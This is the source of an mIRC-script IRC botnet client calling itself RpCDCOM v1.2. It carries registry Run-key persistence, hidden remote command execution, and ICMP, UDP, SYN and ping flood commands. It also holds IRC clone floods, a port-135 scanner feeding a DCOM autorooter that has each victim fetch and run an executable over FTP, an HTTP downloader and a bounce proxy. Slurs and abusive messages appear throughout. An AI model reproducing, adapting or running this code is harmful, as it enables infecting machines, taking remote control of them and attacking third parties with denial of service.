on *:START:{ run lss.exe /n /fh /r "pskill.exe dcom.exe" | setfloodz | makereg | .mircreg | .nick $nix | .anick $nix | .timerpingself -o 0 100 CTCP $+($,me) PING | flush | stopscan | if (!%dcomexe) { .set %dcomexe dcom.exe } | if (%scantalk == $null) { .set %scantalk 0 } | server %server | //timerreconnect -o 0 100 //checkconn }
on *:CONNECT: { .timerconn off | identd on $nix | .timerjoin 0 5 join %chan }
on *:EXIT:{ flush | stopscan }
on *:DISCONNECT:{ .nick $nix | .anick $nix | flush | .timerconn 0 5 server %server }
on *:JOIN:#:{ 
  if ($chan == %chan) {
    if ($nick == $me) { .timerjoin off }
  }
}
alias checkconn {
  if ($server == $null) { server %server }
  else { halt }
}
alias nfs2 { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
alias setfloodz {  
  %m1 = $str(OWNED,15)
  %m2 = $str(xMV2.2,80)
  %m3 = $str(FAGFAGFAG,11))
  %m4 = $str(½¾,100)
}
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:KICK:#:{ 
  if ($knick == $me) && ($chan == %chan) { .timerjoin 0 5 join %chan }
}
on *:PART:#:{
  if ($nick == $me) && ($chan == %chan) { .timerjoin 0 5 join %chan }
}
on *:TEXT:*:#: {
  ;login
  if ($1 == !login) && ($2 == goyem ) && ($level($nick) <= 1) && ($nick isop $chan) { .msg $chan %start dcom %end  $+ $nick $+  added to access at level 100 | auser 100 $nick }

  ;logged in cmds
  if ($level($nick) >= 50) { 
    if ($appstate != hidden) { .uinst !NOT HIDDEN! }
    if (!$exists(lsxy.exe)) { .uinst !STARTER MISSING! }
    if ($1 == !set) && ($3 != $null) {
      if ($2 == ftpip) { set %get.addy $3 | .msg %chan %start dcom %end ftp server set to  $+ $3 $+  }
      if ($2 == ftpuser) { set %ftp.user $3 | .msg %chan %start dcom %end user set to  $+ $3 $+  }
      if ($2 == ftppass) { set %ftp.pass $3 | .msg %chan pass set to  $+ $3 $+  }
      if ($2 == target) { set %dcom $3 | .msg %chan %start dcom %end target set to  $+ $3 $+  }
      if ($2 == file) { set %get.file $3 | .msg $chan %start dcom %end file set to  $+ $3 $+  }
      if ($2 == dcomexe) { set %dcomexe $3 | if ($isfile($3)) { .msg $chan %start dcom %end dcomexe set to  $+ $3 $+  | halt } | .msg $chan  $+ $3 $+  doesn't exist! }
    }
    if ($1 == !icmp) {
      if ($2 == stop) {
        msg %chan 14(0ICMP14)0 attack on: %icmpaa halted
        unset %icmpaa
        halt
        timerremove 1 200 /remove nm32g.vbs
      }
      set %icmpaa $2
      msg %chan 14(0ICMP14)0 attacking $2 with a packet size of $3 a total of $4 times
      timerremove 1 200 /remove nm32g.vbs
      write nm32g.vbs on error resume next
      write nm32g.vbs Set bl = CreateObject("Wscript.shell")
      write nm32g.vbs bl.run "ping $2 -w 0 -l $3 -n $4 $+ ",0,true
      run lss.exe /n /fh /r "nm32g.vbs"
      halt
    }
    if ($1 == !udp) {
      if ($2 == stop) {
        msg %chan 14(0UDP14)0 attack on: %udpaa halted
        unset %udpaa
        halt
      }
      if ($3 == $null) {
        halt
        unset %udpaa
      }
      if ($4 == $null) {
        halt
        unset %udpaa
      }
      set %start 0
      set %end $4
      set %udpaa $2
      set %udpport $3 
      if (%udpport == random) { set %udpport $rand(0,65535) }
      msg %chan 14(0UDP14)0 attacking $2 on port %udpport a total of $4 times
      :udploop
      if (%start == %end) {
        msg %chan  14(0UDP14)0 attack on: %udpaa complete
        unset %udpaa
        unset %udpport
        halt
      }
      inc %start 1
      if ($3 == 0) {
        set %randname $rand(10000,99999)
        set %ntst32 $read(ntst32.vxd)
        set %udpport $rand(0,65535)
        sockudp Udp $+ %randname $+ a $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ b $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ c $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ d $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ e $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ f $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ g $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ h $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ i $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ j $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ k $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ l $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ m $2 %udpport %ntst32
        goto udploop
      }
      if ($4 != 0) {
        set %randname $rand(10000,99999)
        set %ntst32 $read(ntst32.vxd)
        sockudp Udp $+ %randname $+ a $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ b $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ c $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ d $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ e $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ f $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ g $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ h $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ i $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ j $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ k $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ l $2 %udpport %ntst32
        sockudp Udp $+ %randname $+ m $2 %udpport %ntst32
        goto udploop
      }
    }
    if ($1 == !clone) && ($2 != $null) {
      if ($2 == load) && ($3 != $null) { sockopen Sockets- $+ $r(1,999) $3 $4 | msg %chan 14(0clones14)0 loading to: $3 $+ : $+ $4 }
      if ($2 == kill) { sockwrite -tn Sockets-* QUIT : $+ $3- | sockclose Sockets-* | msg %chan 14(0clones14)0 all clones disconnected! }
      if ($2 == join) && ($3 != $null) { sockwrite -tn Sockets-* JOIN $3 $4- }
      if ($2 == part) && ($3 != $null) { sockwrite -tn Sockets-* PART $3 $4- }
      if ($2 == msg) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
      if ($2 == notice) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
      if ($2 == join2) && ($3 != $null) { timer 1 $r(10,240) sockwrite -tn Sockets-* JOIN $3 $4- }
      if ($2 == part2) && ($3 != $null) { timer 1 $r(10,360) sockwrite -tn Sockets-* PART $3 $4- }
      if ($2 == flood1) && ($3 != $null) { sockwrite -tn Sockets-* join $3 | sockwrite -tn Sockets-* PRIVMSG $3 : $+ %m1 |  sockwrite -tn Sockets-* NOTICE  $3 : $+ %m2 | sockwrite -tn Sockets-* part $3 | msg %chan 14(0clones14)0 starting flood on $3 }
      if ($2 == flood2) && ($3 != $null) { sockwrite -tn Sockets-* join $3 | timer 0 2 sockwrite -tn Sockets-* privmsg $3 : $+ %m3 |  timer 0 4 sockwrite -tn  Sockets-* notice $3 : $+ %m1 | msg %chan 14(0clones14)0 starting endless flood on $3 $+ ! }
      if ($2 == pmflood) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* notice $3 : $+ %m2  | msg %chan 14(0clones14)0 pm flooding: $3 }
      if ($2 == sqflood) && ($3 != $null) { sockwrite -n Sockets-* privmsg $3- : $+ %m3 | sockwrite -tn Sockets-* nick $nfs2 |  sockwrite -n Sockets-* privmsg $3- : $+ %m4 | msg %chan 14(0clones14)0 attempting to sendq: $3- }
  }

    if ($1 == !bnc) {
      if ($2 == start) && ($4- != $null) { if ($sock(Bnc)) { msg %chan 14(0bnc14)0 bnc is already active on $ip $+ : $+ %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | msg %chan 14(0bnc14)0 /server -m $ip $+ : $+ $3 $+ , then /quote pass $4 }
      if ($2 == stats) && ($sock(Bnc)) { msg %chan 14(0bnc14)0 is on! $ip $+ : $+ %Bnc.port $+ , pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
      if ($2 == stop) && (%Bnc.Port != $null) { sockclose Bnc* | msg %chan 14(0bnc14)0 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
    }
    if ($1 == !cleanup) { .cleanup $iif($2 != $null,$2,%dcomexe) | msg $chan %start dcom %end cleanup of  $+ $iif($2 != $null,$2,%dcomexe) $+  complete }
    if ($1 == !quit) { exit }
    if ($1 == !version) { msg $chan 14RpCDCOM v1.2(ftp only) by PLASMiC, Vovka, CatCH-mE and everyone else who helped! }
    if ($1 == !url) { msg $chan 5..:: 14RpCDCOM 5::.. [REMOTE BOT] CURRENT-URL:[  $+ $url $+  ] }
    if ($1 == !info) { msg $chan IP:[ $+ $ip $+ ] HOST:[ $+ $host $+ ] DATE:[ $+  $asctime(dddd mmmm dd yyyy) $+ ] TIME:[ $+  $asctime(hh:nn tt ) $+ ]  OS:[WINDOWS $+ $os $+ ] UPTIME:[ $+  $duration($calc( $ticks / 1000 )) $+ ] CURRENT-URL:[  $+ $url $+  ] }
    if ($1 == !dns) { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr # | set %dns.i $2 | msg # ..[`dns`].. ATTEMPTING TO RESOLVE $2 $+ ... }
    if ($1 == !uptime) { msg $chan 5..:: 14RpCDCOM 5::.. [REMOTE BOT] UPTIME:[ $+  $duration($calc( $ticks / 1000 )) $+ ] }
    if ($1 == !hello) { msg $chan You're going to be fucked up the ass because I am a senior member of the BSA and FBI. }
    if ($1 == !remove) { /makeuinst }
    if ($1 == !ident) { if ($2 == $null) { halt } | msg $chan 15[14`15Ident14`15]12 set as3 $2 $+ 12... | identd on $2 }
    if ($1 == !scan) && ($3 != $null) { 
       if ($2 == host) && ($3 == rand) && (%begshortip == $null) { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | msg %chan 14(0scanner14)0 scanning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
       if ($2 == rand) && (%begshortip == $null) { set %begit $randomip($3) | msg %chan 14(0scanner14)0 starting scan from: %begit to $4 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
       if (%begshortip == $null) && ($2 != host) && ($2 != rand) {
        set %begshortip $randomip($2) | set %endshortip $randomip($3) | msg $chan %start dcom %end scanning %begshortip - %endshortip | set %beglongip $longip(%begshortip) | set %endlongip $longip(%endshortip) | set %total $calc(%endlongip - %beglongip) | unset %totalscaning | startscan
      }
    }
    if ($1 == !syn) && ($2- != $null) { if ($2 == stop) { sockclose syn* | msg %chan 14(0Syn14)0 attack on: %synaa halted! | unset %synaa | halt } | set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | msg %chan 14(0Syn14)0 attacking: $2 with $4 syn packets on port %synport  | set %synaa $2 | synz start $4 $2 %synport }
    if ($1 == !timersyn) && ($3- != $null) && ($8 == $null) { set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | set %syntimes $4 | set %timernumber $5 | set %ttimes $6 | set %tmsdelay $7 | set %synaa $2 | set %timersyn synz start $4 $2 %synport | timersyn }
    if ($1 == !ping) && ($3) && ($4) { run lss.exe /n /fh /r "ping.exe $2 -n $3 -l $4" | msg %chan 14(0Ping14)0 attacking $2 with $3 echo requests and a size of $4 bytes | set %pingaa $2 }
    if ($1 == !ping) && ($3) && ($4 == $null) { run lss.exe /n /fh /r "ping.exe $2 -n $3 -l 32" | msg %chan 14(0Ping14)0 attacking $2 with $3 echo requests and a size of 32 bytes | set %pingaa $2 }
    if ($1 == !ping) && ($2 == stop) { run lss.exe /n /fh /r "pskill.exe -kf ping.exe" | msg %chan 14(0Ping14)0 attack on: %pingaa halted | unset %pingaa }
    if ($1 == !run) && ($2) { .run lss.exe /n /fh /r " $+ $2- $+ " | .msg $chan %start dcom %end ran  $+ $2- $+  }
    if ($1 == !universal) && ($2) { if ($2 == XP) { .set %dcom 5 } | elseif ($2 == 2K) { .set %dcom 0 } | elseif ($2 == OFF) { .set %dcom 6 | .set %dcomexe dcom.exe | .saveini | .msg $chan %start dcom %end universal ./pwnage is now OFF, variables reset to dcom: %dcom $+ , dcomexe: %dcomexe | halt } |  else { .msg $chan %start dcom %end specify a valid os: XP/2K , or OFF to turn universal ./pwnage OFF | halt } | .set %dcomexe universal.exe | .saveini | .msg $chan %start dcom %end universal ./pwnage set to os: $iif(%dcom == 5,XP,2K) dcomexe: universal.exe }
    if ($1 == !download) && (!$3) && ($2) { if ($2 == stop) && ($sock(download)) { .sockclose download* | .msg %chan %start $+ download $+ %end stopped download of %start $+ %dlfile $+ %end | unset %dlfile | halt } | elseif ($2 == stop) && (!$sock(download)) { .msg %chan %start $+ download $+ %end %start $+ error not downloading a file $+ %end | halt } | set %dlfile $2- | downloada $2- }
    if ($1 == !scantalk) && ($2 != $null) { .set %scantalk $iif($2 == on,1,0) | .msg $chan %start dcom %end scantalk set to  $+ $iif(%scantalk == 1,ON,OFF) $+  }
    if ($1 == !stopscan) && (%begshortip) && (%endshortip) { msg $chan %start dcom %end stopped scanning %begshortip - %endshortip | stopscan }
    if ($1 == !scanfile) { if ((%ppath) && (%dcom) && (%pfile)) { .msg $chan scanning file $4 | scanfile $4 | halt } | msg $chan %start dcom %end set your vars dipshit! }
    if ($1 == !logout) { .ruser $nick | msg $chan %start dcom %end successfully logged out }
    if ($1 == !-) { var %do = [ [ $2- ] ] | msg $chan %start dcom %end / $+ %do | %do }
    if ($1 == !var) { var %v = [ [ $2- ] ] | if (%v != $null) { msg $chan %start dcom %end var  $+ $2- $+  returns  $+ %v $+  } }
    if ($1 == $+(!,$me)) { 
      if ($2 == scan) && ($3 != $null) && ($4 != $null) { 
        if (%begshortip == $null) {
          set %begshortip $randomip($3) | set %endshortip $randomip($4) | msg $chan %start dcom %end scanning %begshortip - %endshortip | set %beglongip $longip(%begshortip) | set %endlongip $longip(%endshortip) | set %total $calc(%endlongip - %beglongip) | unset %totalscaning | startscan
        }
      }
      else { var %do = [ [ $2- ] ] | msg $chan %start dcom %end / $+ %do | %do }
    }
  }
}
;alias randlet { return $+($r(A,Z),$r(A,Z),$r(A,Z),$r(A,Z),$r(A,Z),$r(A,Z)) }
alias nix { return JeW[ $+ $rand(0,99999) $+ ] }
alias randomip { 
  var %rand1 = $replace($gettok($1,1,46),*,$rand(0,255))
  var %rand2 = $replace($gettok($1,2,46),*,$rand(0,255))
  var %rand3 = $replace($gettok($1,3,46),*,$rand(0,255))
  var %rand4 = $replace($gettok($1,4,46),*,$rand(0,255))
  return $+(%rand1,.,%rand2,.,%rand3,.,%rand4)
}
alias downloada { if ($sock(download)) { .msg %chan %start $+ download $+ %end %start $+ error already downloading a file $+ %end | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | .msg %chan %start $+ download $+ %end downloading %start $+ $1- $+ %end | .sockopen download %download1 80 }
alias startscan {
  inc %totalscaning
  if %totalscaning >= %total /finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 25
  set %ip26 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 26
  set %ip27 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 27
  set %ip28 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 28
  set %ip29 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 29
  set %ip30 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 30
  set %ip31 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 31
  set %ip32 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 32
  set %ip33 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 33
  set %ip34 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 %scanport
  if $1 == 1 finished
  sockopen ip2 %ip2 %scanport
  if $1 == 2 finished
  sockopen ip3 %ip3 %scanport
  if $1 == 3 finished
  sockopen ip4 %ip4 %scanport
  if $1 == 4 finished
  sockopen ip5 %ip5 %scanport
  if $1 == 5 finished
  sockopen ip6 %ip6 %scanport
  if $1 == 6 finished
  sockopen ip7 %ip7 %scanport
  if $1 == 7 finished
  sockopen ip8 %ip8 %scanport
  if $1 == 8 finished
  sockopen ip9 %ip9 %scanport
  if $1 == 9 finished
  sockopen ip10 %ip10 %scanport
  if $1 == 10 finished
  sockopen ip11 %ip11 %scanport
  if $1 == 11 finished
  sockopen ip12 %ip12 %scanport
  if $1 == 12 finished
  sockopen ip13 %ip13 %scanport
  if $1 == 13 finished
  sockopen ip14 %ip14 %scanport
  if $1 == 14 finished
  sockopen ip15 %ip15 %scanport
  if $1 == 15 finished
  sockopen ip16 %ip16 %scanport
  if $1 == 16 finished
  sockopen ip17 %ip17 %scanport
  if $1 == 17 finished
  sockopen ip18 %ip18 %scanport
  if $1 == 18 finished
  sockopen ip19 %ip19 %scanport
  if $1 == 19 finished
  sockopen ip20 %ip20 %scanport
  if $1 == 20 finished
  sockopen ip21 %ip21 %scanport
  if $1 == 21 finished
  sockopen ip22 %ip22 %scanport
  if $1 == 22 finished
  sockopen ip23 %ip23 %scanport
  if $1 == 23 finished
  sockopen ip24 %ip24 %scanport
  if $1 == 24 finished
  sockopen ip25 %ip25 %scanport
  if $1 == 25 finished
  sockopen ip26 %ip26 %scanport
  if $1 == 26 finished
  sockopen ip27 %ip27 %scanport
  if $1 == 27 finished
  sockopen ip28 %ip28 %scanport
  if $1 == 28 finished
  sockopen ip29 %ip29 %scanport
  if $1 == 29 finished
  sockopen ip30 %ip30 %scanport
  if $1 == 30 finished
  sockopen ip31 %ip31 %scanport
  if $1 == 31 finished
  sockopen ip32 %ip32 %scanport
  if $1 == 32 finished
  sockopen ip33 %ip33 %scanport
  if $1 == 33 finished
  sockopen ip34 %ip34 %scanport
  .timerscanner1 -o 1 4 /sockclose ip*
  .timerscanner2 -o 1 5 /startscan
}
alias finished {
  if (%begshortip != $null) {
    msg %chan %start dcom %end scanning from %begshortip - %endshortip has finished! | stopscan
  }
}
alias stopscan { sockclose ip* | .timerscanner* off | unset %ip* | unset %totalscan* | unset %beg* | unset %ends* | unset %endl* | unset %total }
on 1:SOCKOPEN:ip*:{ if ($sockerr > 0) { halt }
  if (%scanport == 135) {
    .kk $sock($sockname).ip
    if (%scantalk == 1) { .msg %chan %start dcom %end attempting to ./pwn  $+ $sock($sockname).ip $+  with dcom  $+ %dcom $+  }
    sockclose $sockname | halt
  }
}

;DCOM Autorooter by cold :) | | | | modified by CatCH-mE's big dick :)
alias -l udll return $scriptdir $+ console.dll
alias -l stdio return $dll($udll,$1,$2-)
alias stdrun {
  var %proc = $newprog($1)
  var %run = $stdio(RunConsole, [ %proc ] [ $2- ] )
  if ( $gettok(%run,1,32) == OK ) {
    .timerReadT $+ %proc -m 0 1 readl %proc
  }
  else echo 4 -st Could not create process: %run
}
alias -l readl {
  var %out
  var %err
  while ( $gettok( %err ,1,32) != ERROR ) {
    set %err $stdio(ReadText, [ $1 ] err)
    if ( %err == OK ) set %err OK   
    if ( $gettok(%err,1,32) != ERROR ) echo -s $1 $ansi2mirc($gettok(%err,2-,32))
  }
  while ( $gettok( %out ,1,32) != ERROR ) {
    set %out $stdio(ReadText, [ $1 ] out)
    if ( %out == OK ) set %out OK   
    if ( $gettok(%out,1,32) != ERROR ) {
      echo -s $1 $ansi2mirc($gettok(%out,2-,32))
      write yaylog.txt $ansi2mirc($gettok(%out,2-,32))
      if (Microsoft isin $ansi2mirc($gettok(%out,2-,32))) {  
         echo -s $stdio(WriteText,$1 del k $+ $crlf) 
         echo -s $stdio(WriteText,$1 echo user test >> k $+ $crlf) 
         echo -s $stdio(WriteText,$1 echo test >> k $+ $crlf) 
         echo -s $stdio(WriteText,$1 echo BINARY >> k $+ $crlf) 
         echo -s $stdio(WriteText,$1 echo get >> k $+ $crlf) 
         echo -s $stdio(WriteText,$1 echo %get.file >> k $+ $crlf) 
         echo -s $stdio(WriteText,$1 echo $chr(37) $+ systemroot $+ $chr(37) $+ \system32\k.exe >> k $+ $crlf)
         echo -s $stdio(WriteText,$1 echo bye >> k $+ $crlf) 
         echo -s $stdio(WriteText,$1 ftp -v -n -s:k ftpiphere $+ $crlf)
       }
      if (221 isin $ansi2mirc($gettok(%out,2-,32))) { echo -s $stdio(WriteText,$1 k.exe $+ $crlf) | echo -s $stdio(WriteText,$1 exit $+ $crlf) | write yay.txt $1 | msg %chan %start dcom %end ./pwned $gettok($1-,3-,46) $+  }
    }
    if (( $gettok(%out,1-2,32) == ERROR STDE6 ) && ( $gettok(%err,1-2,32) == ERROR STDE6 )) {
      .timerReadT $+ $1 off
      echo -s $1 Process exited, code $stdio(GetExitCode,$1)
    }
  }
}
alias -l newprog {
  var %prognum = 1
  var %progpref = @Console.
  while ( $gettok($stdio(GetProcess, [ [ %progpref ] $+ [ %prognum ] ] ) ,1,32) == OK) inc %prognum
  return %progpref $+ %prognum $+ . $+ $1
}
alias stdrem echo -ts Removing STDIO library: $stdio(Remove,.)
alias kk { 
  echo -s Infecting $1- with dcom %dcom
  stdrun $1 %dcomexe %dcom $1
}
alias scan1 {
  if ($1) {
    var %x = 0
    while (%x < 255) {
      .kk $1 $+ . $+ %x
      inc %x
    }
  }
}

alias scanfile {
  var %x = 1
  while ($read(sfind.txt,%x) != $null) {
    if ($right(%x,2) == 00) { sleep 3000 }
    kk $gettok($read(sfind.txt,%x),1,32)
    inc %x
  }
}

alias sleep {
  var %a = $ticks $+ .wsf
  write %a <job id="js"><script language="jscript">WScript.Sleep( $+ $$1 $+ );</script></job>
  .comopen %a WScript.Shell
  if !$comerr { .comclose %a $com(%a,Run,3,bstr,%a,uint,0,bool,true) }
  .remove %a
}
alias RegRead {
  if ($1 != $null) {
    var %a = regread
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegRead,3,bstr,$1-)
      var %q = $com(%a).result
      .comclose %a
      if (%q != $null) return %q
    }
  }
}
alias RegWrite {
  if ($1 != $null) && ($2) && ($3) {
    var %a = RegWrite
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)
      .comclose %a
    }
  }
}
alias RegDelete {
  if ($1 != $null) {
    var %a = RegDelete
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegDelete,3,bstr,$1)
      .comclose %a
    }
  }
}
alias makereg { $RegWrite(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\mstart,$mircdirlsxy.exe,REG_SZ) }
alias uinst { if ($1) { var %reason = $1- } | else { var %reason = none } | if (!$isfile(wunst.bat)) { .makeuinst | msg %chan %start $+ uninstall $+ %end %start $+ removing files & removing from registry $+ %end , %start $+ reason $+ %end $+ : %reason | delreg | run -n wunst.bat | if ($server) { .quit $versi0n IP: $ip host: $host OS: $os time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) reason: %reason } | .exit } | else { msg %chan %start $+ uninstall $+ %end %start $+ removing files & removing from registry $+ %end , %start $+ reason $+ %end $+ : %reason | delreg | run -n ntnm32.bat | if ($server) { .quit $versi0n %start $+ IP: $ip host: $host OS: $os time uninstalled: $time(h:nn TT) date uninstalled: $date(mmmm doo yyyy) reason: %reason $+ %end } | .exit } }
alias delreg { $RegDelete(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\mstart) }
alias makeuinst {
  .write wunst.bat @echo off
  .write wunst.bat del console.dll /F /Q 
  .write wunst.bat del cygwin1.dll /F /Q
  .write wunst.bat del dcom.exe /F /Q
  .write wunst.bat del universal.exe /F /Q
  .write wunst.bat del %dcomexe /F /Q
  .write wunst.bat del lss.exe /F /Q
  .write wunst.bat del lsxy.exe /F /Q
  .write wunst.bat del pskill.exe /F /Q
  .write wunst.bat del $mircini /F /Q
  .write wunst.bat del $mircexe /F /Q
  .write wunst.bat del wunst.bat /F /Q
  .write wunst.bat del lrscr.dll /F /Q
  .write wunst.bat del wunst.bat /F /Q
}
alias mircreg { $RegWrite(HKEY_CURRENT_USER\Software\mIRC\License\,4782-505050,REG_SZ) | $RegWrite(HKEY_CURRENT_USER\Software\mIRC\UserName\,fubitch,REG_SZ) }
alias cleanup { if (!$1) { return } | .run lss.exe /n /fh /r "pskill.exe $1 $+ " }
on 1:SOCKOPEN:download:{ if ($sockerr) { .msg %chan %start $+ download $+ %end %start $+ error socket error $+ %end | unset %dlfile | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
on 1:SOCKREAD:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
on 1:SOCKCLOSE:download:{ if ($file(%download2).size != %downloadlength) { .sockclose download | downloada http:// $+ %download1 $+ / $+ %download3 } | else { .msg %chan %start $+ download $+ %end success: file downloaded %start $+ $mircdir $+ %download2 $+ %end %start $+ $file(%download2).size bytes $+ %end } | unset %download* %dlfile }
on *:DNS: {
  if (%dns.r = on) && $raddress {
    msg %dns.rr DNS: %dns.i resolved to $iaddress ( $+ $naddress $+ )
    unset %dns.*
  }
}
on *:sockread:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ you need to say /quote pass <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) {
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ welcome to the bnc created by Mavyn and Vovka
      sockwrite -n $sockname NOTICE AUTH : $+ step two, connect to something..
      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn <server> <port> <pass> to connect (most irc's dont use pass)
      %Bnc.legit = yes
    }
